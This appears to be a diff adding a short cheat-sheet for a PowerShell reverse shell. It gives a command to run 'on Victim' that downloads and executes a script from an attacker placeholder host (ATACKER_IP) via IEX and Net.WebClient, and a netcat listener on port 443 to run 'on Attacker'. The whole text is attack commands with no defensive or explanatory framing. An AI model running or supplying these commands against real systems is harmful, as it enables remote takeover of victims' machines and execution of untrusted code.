@@ -1,0 +1,5 @@
+Run on Victim :
+IEX (New-Object Net.WebClient).DownloadString('http://ATACKER_IP/shell.ps1')
+
+Run on Attacker :
+nc -l -p 443
